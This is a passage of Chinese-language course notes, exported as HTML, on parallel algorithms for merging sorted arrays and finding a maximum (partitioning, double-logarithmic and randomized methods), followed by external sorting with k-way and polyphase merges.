<h2 id="note-ads-wk13-_4">归并问题<a class="headerlink" href="#note-ads-wk13-_4" title="Permanent link">&para;</a></h2>
<p>归并 - 将两个非递减数组 <span class="arithmatex">\( A(1), A(2), \ldots, A(n) \)</span> 和 <span class="arithmatex">\( B(1), B(2), \ldots, B(m) \)</span> 归并成另一个非递减数组 <span class="arithmatex">\( C(1), C(2), \ldots, C(n+m) \)</span></p>
<h3 id="note-ads-wk13-_5">直接查找<a class="headerlink" href="#note-ads-wk13-_5" title="Permanent link">&para;</a></h3>
<div class="admonition idea">
<p class="admonition-title">Idea</p>
<p>既然我们可以设计并行算法，那么如果我们能同时将所有 <span class="arithmatex">\( A \)</span> 和 <span class="arithmatex">\( B \)</span> 中的元素在最后的数组 <span class="arithmatex">\( C \)</span> 中的位置找到，然后同时将它们放到正确的位置上，那么我们就可以以很快的速度解决这一问题</p>
<p>这里的关键步骤就是同时找到 <span class="arithmatex">\( A \)</span> 和 <span class="arithmatex">\( B \)</span> 中的元素在 <span class="arithmatex">\( C \)</span> 中的位置，这是一个并不困难的问题。例如对 <span class="arithmatex">\( A \)</span> 中的元素 <span class="arithmatex">\( A[i] \)</span>，它在 <span class="arithmatex">\( A \)</span> 中恰是 <span class="arithmatex">\( i+1 \)</span> 个元素（下标从 0 开始），即在它前面有 <span class="arithmatex">\( i \)</span> 个元素。如果我们能找到它在 <span class="arithmatex">\( B \)</span> 中处于</p>
<div class="arithmatex">\[
B[l] &lt; A[i] &lt; B[l+1]
\]</div>
<p>的位置，那么 <span class="arithmatex">\( B \)</span> 中有 <span class="arithmatex">\( l+1 \)</span> 个元素在合并后的 <span class="arithmatex">\( C \)</span> 中位于 <span class="arithmatex">\( A[i] \)</span> 前面。因此此时 <span class="arithmatex">\( A[i] \)</span> 在 <span class="arithmatex">\( C \)</span> 中的位置就是 <span class="arithmatex">\( C[i + l + 1] \)</span>，这样它前面就有 <span class="arithmatex">\( i + (l + 1) \)</span> 个元素。对 <span class="arithmatex">\( B \)</span> 中的元素 <span class="arithmatex">\( B[k] \)</span> 也有类似的分析。</p>
</div>
<figure>
  <img alt="Image title" src="../NOTE/ADS/merge.png" width="80%" />
<br />
<figcaption>排列规则</figcaption>
</figure>
<div class="language-cpp highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#note-ads-wk13-__codelineno-0-1"></a><span class="k">for</span><span class="w"> </span><span class="n">Pi</span><span class="w"> </span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="o">&lt;=</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">&lt;=</span><span class="w"> </span><span class="n">n</span><span class="w">  </span><span class="n">pardo</span>
</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#note-ads-wk13-__codelineno-0-2"></a><span class="w">    </span><span class="n">C</span><span class="p">(</span><span class="n">i</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">RANK</span><span class="p">(</span><span class="n">i</span><span class="p">,</span><span class="w"> </span><span class="n">B</span><span class="p">))</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="n">A</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#note-ads-wk13-__codelineno-0-3"></a><span class="k">for</span><span class="w"> </span><span class="n">Pi</span><span class="w"> </span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="o">&lt;=</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">&lt;=</span><span class="w"> </span><span class="n">n</span><span class="w">  </span><span class="n">pardo</span>
</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#note-ads-wk13-__codelineno-0-4"></a><span class="w">    </span><span class="n">C</span><span class="p">(</span><span class="n">i</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">RANK</span><span class="p">(</span><span class="n">i</span><span class="p">,</span><span class="w"> </span><span class="n">A</span><span class="p">))</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="n">B</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
</span></code></pre></div>
<p>有两种策略</p>
<ol>
<li>
<p><strong>逐个元素二分查找</strong>: 使用二分查找定位到一个元素在另一个数组中的位置其需要 <span class="arithmatex">\( O(\log n) \)</span> 的时间，即 <span class="arithmatex">\( D = O(\log n) \)</span>，总工作量为 <span class="arithmatex">\( O(n \log n) \)</span>；然后我们需要将所有元素放到正确的位置上。这一步复杂为 <span class="arithmatex">\( O(1) \)</span>，总工作量为 <span class="arithmatex">\( O(n) \)</span> (如果数组长度不同则是 <span class="arithmatex">\( O(n+m) \)</span>)，两步合起来复杂为 <span class="arithmatex">\( O(\log n) \)</span>，总工作量为 <span class="arithmatex">\( O(n \log n) \)</span>。</p>
</li>
<li>
<p><strong>整体性查找</strong>: 伪代码如下</p>
</li>
</ol>
<div class="language-cpp highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#note-ads-wk13-__codelineno-1-1"></a><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">j</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span>
</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#note-ads-wk13-__codelineno-1-2"></a><span class="k">while</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">&lt;=</span><span class="w"> </span><span class="n">n</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="n">j</span><span class="w"> </span><span class="o">&lt;=</span><span class="w"> </span><span class="n">m</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#note-ads-wk13-__codelineno-1-3"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="n">A</span><span class="p">(</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">B</span><span class="p">(</span><span class="n">j</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span><span class="w"> </span><span class="p">)</span>
</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#note-ads-wk13-__codelineno-1-4"></a><span class="w">        </span><span class="n">RANK</span><span class="p">(</span><span class="o">++</span><span class="n">i</span><span class="p">,</span><span class="w"> </span><span class="n">B</span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">j</span><span class="p">;</span>
</span><span id="__span-1-5"><a id="__codelineno-1-5" name="__codelineno-1-5" href="#note-ads-wk13-__codelineno-1-5"></a><span class="w">    </span><span class="k">else</span><span class="w"> </span><span class="n">RANK</span><span class="p">(</span><span class="o">++</span><span class="n">j</span><span class="p">,</span><span class="w"> </span><span class="n">A</span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">i</span><span class="p">;</span>
</span><span id="__span-1-6"><a id="__codelineno-1-6" name="__codelineno-1-6" href="#note-ads-wk13-__codelineno-1-6"></a><span class="p">}</span>
</span></code></pre></div>
<p>实际上和归并排序的操作并无本质差别，就是两个数组的元素从头依次向后比较，因此完全没有并行，深度和总工作量都是 <span class="arithmatex">\( O(n) \)</span>（或者数组长度不同就是 <span class="arithmatex">\( O(m + n) \)</span>）</p>
<h3 id="note-ads-wk13-_6">划分范式<a class="headerlink" href="#note-ads-wk13-_6" title="Permanent link">&para;</a></h3>
<p>划分范式的想法非常简单，且实际运用起来非常有效，分为如下两个步骤：</p>
<ol>
<li>
<p><strong>划分 (partitioning)</strong>: 把问题划分为多（设为 <span class="arithmatex">\( p \)</span> 个）很小的子问题。每个子问题大小大致为 <span class="arithmatex">\( n/p \)</span>；</p>
</li>
<li>
<p><strong>实际工作 (actual work)</strong>: 同时对所有子问题进行处理，得到最终结果。</p>
</li>
</ol>
<p>划分：我们将每个数组划分为 <span class="arithmatex">\( p \)</span> 份（此时 <span class="arithmatex">\( p \)</span> 未知，分析后我们可以选取到最优的 <span class="arithmatex">\( p \)</span>），<span class="arithmatex">\( p \)</span> 是一个很大的值，每个子问题很小，如 PPT 第 17 页图所示。我们首先对每个子问题的第一个元素求出它们在另一个数组的位置，这一步应当使用二分查找，否则因为子问题很多，使用线性查找会导致总工作量达到 <span class="arithmatex">\( O(p \cdot n) \)</span>，这几乎是平方级别的工作量，显然是不可接受的；因此我们使用二分查找，这样深度为 <span class="arithmatex">\( O(\log n) \)</span>，总工作量为 <span class="arithmatex">\( O(p \log n) \)</span>；</p>
<figure>
  <img alt="Image title" src="../NOTE/ADS/p1.png" width="80%" />
<br />
<figcaption>划分A</figcaption>
</figure>
<figure>
  <img alt="Image title" src="../NOTE/ADS/p2.png" width="80%" />
<br />
<figcaption>划分B</figcaption>
</figure>
<figure>
  <img alt="Image title" src="../NOTE/ADS/p3.png" width="80%" />
<br />
<figcaption>得到互不相干子问题</figcaption>
</figure>
<p>真实工作：现在剩下的工作就是相邻两个箭头之间的部分需要在这一很小的区域内确认相对位置，因为这些位置确定后直接可以根据上一步划分中得到的结果确定在整
个最终的数组中的位置。</p>
<p>注意，很显然的一点是，这些箭头不会交叉，这是由箭头代表的大小关系决定的。另一方面，相邻两个箭头之间的距离一定不超过 <span class="arithmatex">\( n/p \)</span>，因为一旦超过 <span class="arithmatex">\( n/p \)</span>，那其中一定会有一个箭头（箭头出现的频率是每 <span class="arithmatex">\( n/p \)</span> 个元素一次）。并且一个数组上有 <span class="arithmatex">\( p \)</span> 个出发的位置和 <span class="arithmatex">\( p \)</span> 个到达的位置，所以在任意一个数组上，出发点和到达点一共最多有 <span class="arithmatex">\( 2p \)</span> 个。然后两个数组的这些划分区域按图中形式一一对应进行计算，每个区域实际上就是一个子问题，即现在还剩下 <span class="arithmatex">\( 2p \)</span> 个大小为 <span class="arithmatex">\( O(n/p) \)</span> 的子问题。这时我们并行对每个子问题直接使用线性查找即可，因为每个子问题都非常小（大小为 <span class="arithmatex">\( O(n/p) \)</span>），此时深度为 <span class="arithmatex">\( O(n/p) \)</span> 也很小，总工作量为 <span class="arithmatex">\( 2p \cdot O(n/p) = O(n) \)</span> 是符合要求的。而如果使用二分查找，总工作量为</p>
<div class="arithmatex">\[
2p \cdot \frac{n}{p} \cdot O\left(\log \frac{n}{p}\right) = 2n \log \frac{n}{p},
\]</div>
<p>这是因为有 <span class="arithmatex">\( 2p \)</span> 个子问题，每个子问题都至多有 <span class="arithmatex">\( \frac{n}{p} \)</span> 个元素要用至多 <span class="arithmatex">\( \log \left( \frac{n}{p} \right) \)</span> 的时间确定位置，这并无法保证是 <span class="arithmatex">\( O(n) \)</span> 的。</p>
<p>现在的问题就在于，还有两个时间复杂度未定：第一步划分的总工作量为 <span class="arithmatex">\( O(p \log n) \)</span>，第二步真实工作的深度为 <span class="arithmatex">\( O(n/p) \)</span>。我们希望找到一个最优的 <span class="arithmatex">\( p \)</span>，使得第一步总工作量是 <span class="arithmatex">\( O(n) \)</span> 的，第二步深度是 <span class="arithmatex">\( O(\log n) \)</span> 的。这样我们就可以得到一个深度为 <span class="arithmatex">\( O(\log n) \)</span>，总工作量为 <span class="arithmatex">\( O(n) \)</span> 的并行算法，成功做到取长补短。事实上，我们很容易看出，<span class="arithmatex">\( p = \frac{n}{\log n} \)</span> 就是满足条件的，因此我们就选取这个 <span class="arithmatex">\( p \)</span>，得到了一个深度为 <span class="arithmatex">\( O(\log n) \)</span>，总工作量为 <span class="arithmatex">\( O(n) \)</span> 的并行算法。</p>
<h2 id="note-ads-wk13-_7">寻找最大元素<a class="headerlink" href="#note-ads-wk13-_7" title="Permanent link">&para;</a></h2>
<p>给定一组数列 <span class="arithmatex">\( A \)</span>，要求找到其中最大的元素。</p>
<h3 id="note-ads-wk13-_8">不使用划分范式<a class="headerlink" href="#note-ads-wk13-_8" title="Permanent link">&para;</a></h3>
<p>类似于前面求和问题的做法，构造一棵二叉树，初始元素两两分组比较，然后逐层上递，最终得到最大值。这样的算法深度为 <span class="arithmatex">\( O(\log n) \)</span>，总工作量为 <span class="arithmatex">\( O(n) \)</span></p>
<p>我们可以采取更激进的策略：为什么不一次性比较所有元素呢？这样深度只需 <span class="arithmatex">\( O(1) \)</span>。如果不考虑总工作量过大的问题，这种方法是可行的：并行比较每一对元素 <span class="arithmatex">\( A[i] \)</span> 和 <span class="arithmatex">\( A[j] \)</span>，只要 <span class="arithmatex">\( A[i] \)</span> 在比较中较小，就在新数组 <span class="arithmatex">\( B[i] \)</span> 中写入 1（初始时 <span class="arithmatex">\( B \)</span> 的所有位置为 0）。最终，最大的元素从未被写入 1，因此仍为 0。我们并行检查 <span class="arithmatex">\( B \)</span> 中哪个元素为 0，即为最大值。</p>
<p>这类似于一场混战，每个人都要与他人对战，胜者留下，败者离场。最后留下的就是最大者。</p>
<p>在并行比较每对元素时，可能会有多个线程同时写入数组 <span class="arithmatex">\( B \)</span>。实际上，我们只需使用前面提到的 CRCW 策略，允许同时写入，并按 common 规则写入即可，因为所有线程在任意 <span class="arithmatex">\( B[i] \)</span> 处只会写入数字 1，故用 common 规则即可实现写入。</p>
<p>显然，这种算法的深度非常理想，为 <span class="arithmatex">\( O(1) \)</span>，但总工作量主要在于比较每对元素的值，因此为 <span class="arithmatex">\( O(n^2) \)</span>。如果能在总工作量和深度上取长补短，这两种方法将非常完美。</p>
<h3 id="note-ads-wk13-double-logarithmic-partitioning">双对数划分范式(double logarithmic partitioning)<a class="headerlink" href="#note-ads-wk13-double-logarithmic-partitioning" title="Permanent link">&para;</a></h3>
<p>双对数范式是一种可以二叉树的扩展。在完全二叉树中，设叶子的数量为 <span class="arithmatex">\( n \)</span>，那么树高是 <span class="arithmatex">\( \log n \)</span> 级别的，
这里双对数则是希望构造一棵树，使得树高是 <span class="arithmatex">\( \log \log n \)</span> 级别的。为了构造这样一棵树，我们首先设树
中每个节点的 level 为从根到该节点的距离（需要经过的边数），根的 level 为 0。接下来我们构造这棵
树如下：</p>
<ol>
<li>
<p>设某个节点的 level 为 <span class="arithmatex">\( s \)</span>，当 <span class="arithmatex">\( s \leq \log \log n - 1 \)</span> 时，则它有 <span class="arithmatex">\( 2^{2^{h-s-1}} \)</span> 个孩子；</p>
</li>
<li>
<p>当 <span class="arithmatex">\( s = \log \log n \)</span> 时，它有 2 个孩子作为树的叶子。</p>
</li>
</ol>
<p>事实上，我们可以观察到，当一个节点的层级（level）为 <span class="arithmatex">\( s \)</span> 且不在倒数两行时，根据定义，它有 <span class="arithmatex">\( 2^{2^{h-s-1}} \)</span> 个孩子。以该节点为根的子树的叶子数量可以计算为 <span class="arithmatex">\( 2^{2^{h-s}} \)</span>。我们知道：</p>
<div class="arithmatex">\[
2^{2^{h-s-1}} = \sqrt{2^{2^{h-s}}}
\]</div>
<p>这意味着在每个节点处，我们实际上将问题分成了 <span class="arithmatex">\( \sqrt{m} \)</span> 个子问题，其中 <span class="arithmatex">\( m \)</span> 是该节点对应的子树的叶子数量。我们知道，在双对数树中，某一层单个节点为根的子树的叶子数，其实是上一层某个节点为根的子树的叶子数的平方根（因为层数为 <span class="arithmatex">\( s \)</span> 的某个节点，以它为根的子树的叶子数量是 <span class="arithmatex">\( 2^{2^{h-s}} \)</span>，每增加一层 <span class="arithmatex">\( s \)</span> 实际上就是开一次平方根）。因此，层数越往下，子问题的大小逐步开平方根。</p>
<p>假设原问题的输入大小为 <span class="arithmatex">\( n \)</span>，我们可以通过添加一些虚拟节点（dummy nodes）来构造出以这 <span class="arithmatex">\( n \)</span> 个节点为叶子的双对数树。这样，我们就可以使用双对数范式来设计一个并行算法，即在每一层将问题分为 <span class="arithmatex">\( \sqrt{m} \)</span> 个子问题，其中 <span class="arithmatex">\( m \)</span> 是这一层单个节点为根的子树的叶子数量。这样，每个子问题（实际上就是树上的某个节点）对应的叶子数也就是 <span class="arithmatex">\( \sqrt{m} \)</span>，这就与双对数树结合起来了。我们熟知的二叉树则是每层分成两个子问题，是更简单的策略。</p>
<p>将这一思路套用在我们的问题上：我们首先将数组划分为 <span class="arithmatex">\( \sqrt{n} \)</span> 份，每一份的大小为 <span class="arithmatex">\( \sqrt{n} \)</span>，然后我们并行递归找到每一份中的最大值，最后在归并阶段再并行找到这 <span class="arithmatex">\( \sqrt{n} \)</span> 个最大值中的最大值即可。设整个算法深度为 <span class="arithmatex">\( D(n) \)</span>，工作量为 <span class="arithmatex">\( W(n) \)</span>，它们都是关于数组长度的函数。每一份中的最大值我们采用递归的策略，因此长度为 <span class="arithmatex">\( \sqrt{n} \)</span> 的数组的最大值的寻找需要 <span class="arithmatex">\( D(\sqrt{n}) \)</span> 的深度和 <span class="arithmatex">\( W(\sqrt{n}) \)</span> 的总工作量。以上是递归阶段，在归并阶段，返回的 <span class="arithmatex">\( \sqrt{n} \)</span> 个最大值中的最大值我们采用前面的两两比较的方法即可，深度为 <span class="arithmatex">\( O(1) \)</span>，总工作量为 <span class="arithmatex">\( O((\sqrt{n})^2) = O(n) \)</span>。于是我们按照分治法的方式可以写出递推式</p>
<div class="arithmatex">\[
   D(n) = D(\sqrt{n}) + O(1)
\]</div>
<div class="arithmatex">\[
   W(n) = \sqrt{n} W(\sqrt{n}) + O(n)
\]</div>
<p>换元法得到 <span class="arithmatex">\(D(n) = O(\log \log n)\)</span>，<span class="arithmatex">\(W(n) = O(n \log \log n)\)</span>。</p>
<figure>
  <img alt="Image title" src="../NOTE/ADS/max.png" width="80%" />
<br />
<figcaption>双对数划分范式</figcaption>
</figure>
<h3 id="note-ads-wk13-accelerated-cascade">加速级联范式(accelerated cascade)<a class="headerlink" href="#note-ads-wk13-accelerated-cascade" title="Permanent link">&para;</a></h3>
<ol>
<li>将数组分为 <span class="arithmatex">\( \frac{n}{\log \log n} \)</span> 份，即每一份的大小为 <span class="arithmatex">\( \log \log n \)</span>，实际上每一份的大小都很小了，所以我们可以直接利用线性查找的方式找到每一份的最大值，则每一份的深度和工作量都是 <span class="arithmatex">\( O(\log \log n) \)</span> 的；</li>
<li>然后我们对上面求出的 <span class="arithmatex">\( \frac{n}{\log \log n} \)</span> 个最大值使用双对数范式的算法。</li>
</ol>
<p>总的深度为每一份的深度加上双对数范式的深度，即 </p>
<div class="arithmatex">\[
D(n) = O(\log \log n) + O(\log \log (n/\log \log n)) = O(\log \log n)
\]</div>
<p>总工作量为每一份的工作量之和加上双对数范式的总工作量，即 </p>
<div class="arithmatex">\[
    W(n) = \frac{n}{\log \log n} \cdot O(\log \log n) + O(n/ \log \log n \cdot \log \log(n/ \log \log n)) = O(n)
\]</div>
<h3 id="note-ads-wk13-_9">随机算法<a class="headerlink" href="#note-ads-wk13-_9" title="Permanent link">&para;</a></h3>
<p>看起来我们还有改进的空间，毕竟当初暴力的两两比较方法能实现 O(1) 的深度。接下来的随机算法，它可以保证以非常高的概率在 O(1) 的深度和 O(n) 的工作量内找到最大值。</p>
<ol>
<li>
<p><strong>第一步</strong>: 从长度为 <span class="arithmatex">\( n \)</span> 的数组 <span class="arithmatex">\( A \)</span> 中，依照均匀分布取出 <span class="arithmatex">\( n^{7/8} \)</span> 个元素，得到新的数组记为 <span class="arithmatex">\( B \)</span>。这一步需要 <span class="arithmatex">\( n^{7/8} \)</span> 个处理器各自负责抽一个然后放到内存中某个位置，深度为 <span class="arithmatex">\( O(1) \)</span>，总工作量为 <span class="arithmatex">\( O(n^{7/8}) \)</span>。</p>
</li>
<li>
<p><strong>第二步</strong>: 求出 <span class="arithmatex">\( B \)</span> 中的最大值，使用确定性的算法实现，通过如下三个子步骤实现：</p>
</li>
<li>把 <span class="arithmatex">\( B \)</span> 分成 <span class="arithmatex">\( n^{3/4} \)</span> 个长度为 <span class="arithmatex">\( n^{1/8} \)</span> 的子数组，然后使用两两比较的暴力算法并行找到每个子数组的最大值。这一步深度为 <span class="arithmatex">\( O(1) \)</span>，总工作量为 <span class="arithmatex">\( O(n^{3/4} \cdot (n^{1/8})^2) = O(n) \)</span>，因为有 <span class="arithmatex">\( n^{3/4} \)</span> 个子数组，每个子数组用两两比较的办法的复杂度是数组长度平方级别的；然后将这 <span class="arithmatex">\( n^{3/4} \)</span> 个最大值放在新数组 <span class="arithmatex">\( C \)</span> 中。</li>
<li>把 <span class="arithmatex">\( C \)</span> 分成 <span class="arithmatex">\( n^{1/2} \)</span> 个长度为 <span class="arithmatex">\( n^{1/4} \)</span> 的子数组，然后使用两两比较的暴力算法并行找到每个子数组的最大值。这一步深度为 <span class="arithmatex">\( O(1) \)</span>，总工作量为 <span class="arithmatex">\( O(n^{1/2} \cdot (n^{1/4})^2) = O(n) \)</span>，然后将这 <span class="arithmatex">\( n^{1/2} \)</span> 个最大值放在新数组 <span class="arithmatex">\( D \)</span> 中。</li>
<li>数组 <span class="arithmatex">\( D \)</span> 直接使用两两比较的方法找到最大值。这一步深度为 <span class="arithmatex">\( O(1) \)</span>，总工作量为 <span class="arithmatex">\( O((n^{1/2})^2) = O(n) \)</span>。</li>
</ol>
<p>综合上述方法，整个第二步相当于一个三轮的淘汰赛，整体而言第二步的深度为 <span class="arithmatex">\( O(1) \)</span>，总工作量为 <span class="arithmatex">\( O(n) \)</span>，并且我们能求出 <span class="arithmatex">\( B \)</span> 中的最大值，也就是抽取的 <span class="arithmatex">\( n^{7/8} \)</span> 个元素中的最大值。</p>
<p>第三步：目前我们只得到了 <span class="arithmatex">\( n^{7/8} \)</span> 个元素中的最大值（记为 <span class="arithmatex">\( M \)</span>）。如何进一步提高概率呢？答案是再来一轮，但这再来一轮是有讲究的。这一步我们首先均匀分布取出 <span class="arithmatex">\( n^{7/8} \)</span> 个元素，得到数组 <span class="arithmatex">\( B \)</span>。然后用 <span class="arithmatex">\( n \)</span> 个处理器，每个处理器放 <span class="arithmatex">\( A \)</span> 的一个元素，与前一步得到的 <span class="arithmatex">\( M \)</span> 进行比较。如果小于 <span class="arithmatex">\( M \)</span>，则什么也不用做；大于 <span class="arithmatex">\( M \)</span> 则往数组 <span class="arithmatex">\( B \)</span> 的一个随机位置写入这一更大的值。为什么要随机写入呢？因为一共 <span class="arithmatex">\( n \)</span> 个处理器，但只有 <span class="arithmatex">\( n^{7/8} \)</span> 个位置可供选择，不能一一对应位置供每个处理器使用，但我们又要在 <span class="arithmatex">\( O(1) \)</span> 时间内完成位置分配，只能是随机了。写完后，我们再次求出更新后的 <span class="arithmatex">\( B \)</span> 中的最大值。这一步的深度和工作量与第二步相同，因此是 <span class="arithmatex">\( O(1) \)</span> 的深度和 <span class="arithmatex">\( O(n) \)</span> 的工作量。</p>
<mark class="critic block">
<p>以上算法以非常高的概率在 <span class="arithmatex">\( O(1) \)</span> 的深度和 <span class="arithmatex">\( O(n) \)</span> 的工作量内找到数组 <span class="arithmatex">\( A \)</span> 中的最大值：存在常数 <span class="arithmatex">\( c \)</span>，使得算法只有 <span class="arithmatex">\( \frac{1}{n^c} \)</span> 的概率无法在这一时间复杂度内找到最大值。</p>
</mark></section><section class="print-page" id="note-ads-wk14" heading-number="2.2.3.16"><h1 id="note-ads-wk14-external-sorting">外部排序(External Sorting)<a class="headerlink" href="#note-ads-wk14-external-sorting" title="Permanent link">&para;</a></h1>
<div style="margin-top: -30px; font-size: 0.75em; opacity: 0.7;">
<p><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 2A10 10 0 0 0 2 12a10 10 0 0 0 10 10 10 10 0 0 0 10-10h-2a8 8 0 0 1-8 8 8 8 0 0 1-8-8 8 8 0 0 1 8-8zm6.78 1a.7.7 0 0 0-.48.2l-1.22 1.21 2.5 2.5L20.8 5.7c.26-.26.26-.7 0-.95L19.25 3.2c-.13-.13-.3-.2-.47-.2m-2.41 2.12L9 12.5V15h2.5l7.37-7.38z"/></svg></span> 约 1912 个字 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21 17H7V3h14m0-2H7a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V3a2 2 0 0 0-2-2M3 5H1v16a2 2 0 0 0 2 2h16v-2H3m12.96-10.71-2.75 3.54-1.96-2.36L8.5 15h11z"/></svg></span> 9 张图片 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 20c4.42 0 8-3.58 8-8s-3.58-8-8-8-8 3.58-8 8 3.58 8 8 8m0-18c5.5 0 10 4.5 10 10s-4.5 10-10 10C6.47 22 2 17.5 2 12S6.5 2 12 2m.5 11H11V7h1.5v4.26l3.7-2.13.75 1.3z"/></svg></span> 预计阅读时间 7 分钟</p>
</div>
<p>大部分排序算法都依赖于内存可以直接寻址的特性，但是如果数据输入在磁带上，由于磁带只能被顺序访问，所以适合用于外部排序的排序算法是归并排序。</p>
<h2 id="note-ads-wk14-_1">简单做法<a class="headerlink" href="#note-ads-wk14-_1" title="Permanent link">&para;</a></h2>
<figure>
  <img alt="Image title" src="../NOTE/ADS/simple.png" width="80%" />
<br />
<figcaption>简单做法</figcaption>
</figure>
<p>假设一开始数据存在磁带<span class="arithmatex">\(T_1\)</span>上，外部内存容量是3，则依次读取3个数据为一组，交替放在磁带<span class="arithmatex">\(T_2\)</span>和<span class="arithmatex">\(T_3\)</span>上，然后按对应归并<span class="arithmatex">\(T_2\)</span>和<span class="arithmatex">\(T_3\)</span>上的数据，结果交替放在<span class="arithmatex">\(T_1\)</span>和<span class="arithmatex">\(T_4\)</span>上，然后重复这个过程，直到所有数据都排序完成。</p>
<div class="admonition definition">
<p class="admonition-title">Definition</p>
<ul>
<li>run: 每组排好序的数据称为一个run</li>
<li>pass: 将所有数据读过一遍的称为一个pass</li>
</ul>
</div>
<p>对于上述的例子，需要第一次从<span class="arithmatex">\(T_1\)</span>读的一个pass加上下面三个归并的过程，一共有<span class="arithmatex">\(1+3=4\)</span>个pass。</p>
<p>对于<span class="arithmatex">\(N\)</span>个数据，如果外部内存容量是<span class="arithmatex">\(M\)</span>，则需要<span class="arithmatex">\(1+\lceil \log_2(N/ M) \rceil\)</span>个pass。</p>
<h2 id="note-ads-wk14-k-way-merge">K-way Merge<a class="headerlink" href="#note-ads-wk14-k-way-merge" title="Permanent link">&para;</a></h2>
<p>第一个优化方向就是减少工作的趟数，显然如果我们使用 k 路的归并，也就是每次归并 k 条纸带上对应位置的顺串，那么每次合并后顺串长度增加 k 倍，因此加上初始的 1 趟，我们只需要$ 1 + \lceil \log_k(N/M) \rceil $趟即可完成排序，减少了趟数，因此减少了磁带移动的次数，从而减少总时间。这样的算法称为 k 路合并。</p>
<p>k 路合并有一个实现上需要注意的点，因为我们是 k 个顺串要合并，因此我们需要不断的在 k 个元素中选取最小值放到输出的磁带上，这个操作可以使用优先队列来实现。</p>
<figure>
  <img alt="Image title" src="../NOTE/ADS/kway.png" width="80%" />
<br />
<figcaption>k 路合并</figcaption>
</figure>
<div class="admonition key-point">
<p class="admonition-title">Key-point</p>
<p>对于k路合并，需要<span class="arithmatex">\(2k\)</span>个tape。</p>
</div>
<h2 id="note-ads-wk14-_2">多相合并<a class="headerlink" href="#note-ads-wk14-_2" title="Permanent link">&para;</a></h2>
<p>为了优化多路合并对于磁带数的成本，我们考虑多相合并，这种方法对于多路合并的磁带成本可以从<span class="arithmatex">\(2k\)</span>减少到<span class="arithmatex">\(k+1\)</span>。</p>
<p>首先，假设我们有三个磁带，使用2-way merge:</p>
<figure>
  <img alt="Image title" src="../NOTE/ADS/mul1.png" width="80%" />
<br />
<figcaption>均分</figcaption>
</figure>
<p>设有三盘磁带<span class="arithmatex">\(T_1、T_2\)</span>和<span class="arithmatex">\(T_3\)</span>。在<span class="arithmatex">\(T_1\)</span>上有一个输入文件，它将产生<span class="arithmatex">\(34\)</span>个顺串(run)。我们可以选择在<span class="arithmatex">\(T_2\)</span>和<span class="arithmatex">\(T_3\)</span>的每一盘磁带中放入<span class="arithmatex">\(17\)</span>个顺串。然后，将结果合并到<span class="arithmatex">\(T_1\)</span>上，得到一盘有<span class="arithmatex">\(17\)</span>个顺串的磁带。由于所有的顺串都在一盘磁带上，因此我们必须将其中的一些顺串放到<span class="arithmatex">\(T_2\)</span>上以进行另一次合并。合并的逻辑是将前<span class="arithmatex">\(8\)</span>个顺串从<span class="arithmatex">\(T_1\)</span>拷贝到<span class="arithmatex">\(T_2\)</span>并进行合并。这样做的结果是，每次合并都需要额外的复制工作，而复制也需要磁头的移动，这是一项昂贵的操作，因此这种方法并不好。如果我们继续完成所有步骤，我们会发现总共需要<span class="arithmatex">\(1\)</span>次初始操作<span class="arithmatex">\(+6\)</span>次合并工作，外加<span class="arithmatex">\(5\)</span>次复制操作,This sucks.</p>
<figure>
  <img alt="Image title" src="../NOTE/ADS/mul2.png" width="80%" />
<br />
<figcaption>不均分</figcaption>
</figure>
